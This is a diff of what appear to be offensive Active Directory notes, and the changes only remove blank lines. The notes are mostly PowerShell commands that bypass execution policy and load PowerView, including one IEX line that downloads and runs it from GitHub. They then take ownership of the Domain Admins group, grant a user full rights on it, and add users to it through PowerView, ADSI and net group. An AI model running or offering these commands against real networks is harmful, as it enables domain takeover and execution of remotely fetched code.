@@ -5,13 +5,9 @@
 
 ```bash
 powershell -ep bypass
-
 Import-Module .\PowerView.ps1
-
 Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'goodboy'
-
 Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "goodboy"
-
 net group "domain admins" goodboy /add /domain
 ```
 
@@ -41,9 +37,7 @@ $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 
 ```bash
 $group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
-
 $group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("bank\goodboy"))
-
 $group.psbase.CommitChanges()
 ```
 - Add self to group
@@ -63,11 +57,9 @@ $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
-
 Get-Command -Module PowerView
 ```
 - Note: (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
-
 - Verify if 'bb2' has WriteDACL on Domain Admins
 ```bash
 Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
@@ -100,9 +92,7 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 ```bash
 powershell -ep bypass
 Import-Module .\powerview.ps1
-
 Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl
-
 Set-ExecutionPolicy Bypass -Scope Process -Force
 ```
 
@@ -114,7 +104,6 @@ Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbos
 ```bash
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
 ```
-
 - 3.Add to group
 ```bash
 Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose
